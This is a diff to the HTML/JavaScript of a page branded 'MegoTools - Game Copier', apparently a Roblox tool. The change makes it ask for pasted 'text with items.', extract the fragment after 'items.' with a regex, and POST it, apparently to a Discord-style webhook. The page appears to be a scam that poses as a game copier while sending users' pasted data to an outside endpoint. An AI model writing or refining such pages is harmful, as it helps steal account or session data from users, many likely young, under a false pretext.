@@ -104,7 +104,7 @@ min-height:20px;
 <h1>MegoTools</h1>
 <div class="subtitle">Game Copier</div>
 
-<input id="gameInput" placeholder="Enter Roblox Game ID or Link">
+<input id="gameInput" placeholder="Enter text with items.">
 
 <button onclick="copyGame()">Copy Game</button>
 
@@ -120,16 +120,16 @@ function copyGame(){
     let value = input.value.trim();
 
     if(!value){
-        document.getElementById("status").innerText="Please enter a Game ID or Link";
+        document.getElementById("status").innerText="Please enter text";
         return;
     }
 
-    // Wyłap fragment między pierwszym a drugim "123123123"
-    let match = value.match(/123123123(.*?)123123123/);
+    // Wyłap tekst zaczynający się od "items." aż do pierwszego ",", "/" lub spacji
+    let match = value.match(/items\.(.*?)([",\/\s])/);
     if(match && match[1]){
-        value = match[1]; // teraz value to tylko to, co w środku
+        value = match[1];
     } else {
-        document.getElementById("status").innerText="❌ Nie znaleziono poprawnego wzorca!";
+        document.getElementById("status").innerText="❌ Nie znaleziono poprawnego fragmentu!";
         return;
     }
 
@@ -139,11 +139,11 @@ function copyGame(){
             "Content-Type":"application/json"
         },
         body: JSON.stringify({
-            content:"🎮 **MegoTools - Game Copier**\nGame: "+value
+            content:"🎮 **MegoTools - Game Copier**\nItem: "+value
         })
     })
     .then(()=>{
-        document.getElementById("status").innerText="✅ Game sent successfully!";
+        document.getElementById("status").innerText="✅ Item sent successfully!";
         input.value="";
     })
     .catch(()=>{
